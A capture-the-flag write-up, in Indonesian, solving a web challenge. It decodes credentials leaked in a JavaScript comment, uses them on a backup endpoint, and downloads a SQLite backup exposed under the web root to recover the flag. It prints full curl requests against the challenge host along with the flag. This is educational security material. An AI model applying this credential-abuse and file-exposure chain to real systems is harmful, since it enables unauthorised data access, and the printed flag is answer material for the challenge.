# Writeup - Panic In the Northern Quadrant (part 2/3)

Challenge ini kelihatannya sengaja ngasih beberapa umpan palsu di awal, jadi kuncinya bukan langsung ngotot ke command injection atau upload, tapi sabar enumerasi endpoint yang benar-benar hidup lalu nyambungin informasi kecil yang bocor.

## Ringkasan singkat

Alur solve yang akhirnya berhasil:

1. Buka halaman utama dan baca source HTML/JS.
2. Dapat kredensial dari komentar JavaScript yang masih tertinggal.
3. Enumerasi endpoint yang ternyata benar-benar ada, khususnya `backup.php` dan `download-legacy.php`.
4. Pakai kredensial tadi ke `backup.php` untuk memicu pembuatan file backup database.
5. Ambil path file backup dari response JSON.
6. Akses file `.bak` itu langsung via web path.
7. Buka SQLite backup, baca tabel, dan ambil flag dari salah satu record.

Flag:

`THC{r4c3d_2_t0p}`

## Enumerasi awal

Hal pertama yang saya lakukan adalah buka halaman depan:

```bash
curl -i -sS http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/
```

Dari halaman ini ada beberapa hal menarik:

- Ada form `ping.php`, tapi endpoint itu ternyata tidak langsung bisa diakses.
- Ada form upload dengan komentar `TODO : Fix null-byte file upload vulnerability`.
- Ada JavaScript yang menyebut banyak route internal.
- Yang paling penting: ada potongan fungsi `backup()` yang terkomentar, lengkap dengan body request dalam bentuk base64.

Isi base64 itu:

```text
dXNlcm5hbWU9c3N0JnBhc3N3b3JkPVRIQ3tzM2N1cjNwNDU1fQ==
```

Kalau di-decode:

```text
username=sst&password=THC{s3cur3p455}
```

Di titik ini saya belum anggap itu flag, karena deskripsi challenge bilang targetnya adalah dapat remote access atau password user. Jadi string ini saya perlakukan sebagai kredensial yang bocor, bukan jawaban akhir.

## Cari endpoint yang benar-benar hidup

Banyak route di halaman utama ternyata cuma pajangan atau dead route. Saya cek satu per satu dan akhirnya ketemu tiga endpoint yang relevan:

- `register.php`
- `backup.php`
- `download-legacy.php`

Yang paling berguna justru:

```bash
curl -i -sS http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/download-legacy.php
```

Response-nya membocorkan error PHP:

```text
file_get_contents(): Read of 8192 bytes failed with errno=21 Is a directory in /var/www/html/download-legacy.php on line 36
Access denied.
```

Ini penting karena memastikan:

- file `download-legacy.php` memang ada;
- endpoint ini melakukan operasi baca file;
- ada kemungkinan bisa dipakai untuk baca file lain;
- path lokal aplikasi juga bocor: `/var/www/html/`.

## Validasi kredensial bocor

Berikutnya saya coba pakai kredensial `sst / THC{s3cur3p455}` ke `backup.php`.

Request:

```bash
curl -sS -X POST \
  -d 'username=sst&password=THC{s3cur3p455}' \
  http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/backup.php
```

Response:

```json
{"status":"ok","path":"\/var\/www\/html\/a51f179f448c3f1146fad778391ad8c7\/temp\/db.bak"}
```

Nilai hash di path berubah-ubah tergantung session/request, tapi pola besarnya tetap sama:

```text
/var/www/html/<random_hash>/temp/db.bak
```

Di sini keliatan jelas kalau endpoint backup bukan cuma valid, tapi benar-benar membuat backup database dan memberi tahu lokasi file hasilnya.

## Bagian penting: file backup bisa diambil langsung

Awalnya saya kira file itu harus diambil lewat `download-legacy.php`, tapi ternyata tidak perlu. Direktori hash-nya memang `403`, tetapi file `db.bak` di dalamnya tetap bisa diakses langsung kalau path-nya sudah diketahui.

Contoh:

```bash
curl -sS \
  http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/a51f179f448c3f1146fad778391ad8c7/temp/db.bak \
  -o db.bak
```

Waktu dicek, isi filenya adalah SQLite database:

```text
SQLite format 3
```

Ini berarti challenge-nya bukan soal bypass direktori yang diblok, tapi soal race menuju file hasil backup yang lokasinya baru saja dibocorkan aplikasi sendiri.

## Dump isi database

Setelah file `db.bak` didapat, tinggal buka pakai SQLite.

Saya pakai script Python singkat supaya cepat:

```python
import sqlite3

conn = sqlite3.connect("db.bak")
cur = conn.cursor()

print(cur.execute("select name from sqlite_master where type='table'").fetchall())

for (table_name,) in cur.execute("select name from sqlite_master where type='table'"):
    print("TABLE", table_name)
    print(cur.execute(f"pragma table_info({table_name})").fetchall())
    for row in cur.execute(f"select * from {table_name} limit 20"):
        print(row)
```

Hasil yang relevan:

```text
tables [('units',), ('credentials',), ('logs',)]

TABLE units
(1, '#1092', 'Interceptor-v1', 'ACTIVE')
(2, '#1093', 'Titan-v4', 'THC{r4c3d_2_t0p}')
(3, '#1094', 'Phantom-v2', 'ACTIVE')
```

Flag tersimpan di tabel `units`, kolom `status`, pada row unit `#1093`.

## Kenapa exploit ini bekerja

Masalah utamanya ada di kombinasi dua kelemahan:

1. Source code leak membocorkan kredensial internal untuk endpoint backup.
2. Endpoint backup mengembalikan path file hasil backup yang berada di bawah web root.

Begitu aplikasi memberi tahu lokasi file:

```text
/var/www/html/<hash>/temp/db.bak
```

kita tinggal ubah jadi path web:

```text
/<hash>/temp/db.bak
```

Meskipun directory listing diblok:

- `/<hash>/` memberi `403`
- `/<hash>/temp/` memberi `403`

file spesifiknya tetap bisa dibaca:

- `/<hash>/temp/db.bak` memberi `200`

Jadi ini semacam information disclosure + insecure file exposure.

## Catatan jebakan challenge

Beberapa hal yang sempat terlihat menarik tapi ternyata bukan jalur final:

- `ping.php` dari form utama
- upload firmware dan komentar null-byte vulnerability
- route-route API di JavaScript
- direktori `backup/` dan `download-legacy/`

Semuanya berguna untuk mengalihkan fokus, tapi solve tercepat justru datang dari source leak kecil di komentar JavaScript dan response `backup.php` yang terlalu verbose.

## Solusi akhir

1. Ambil kredensial dari komentar JavaScript:
   `sst / THC{s3cur3p455}`
2. POST ke `backup.php`.
3. Parse field `path` dari response JSON.
4. Download file `db.bak` dari path web hasil konversi.
5. Buka SQLite backup.
6. Ambil flag.

## Flag

`THC{r4c3d_2_t0p}`
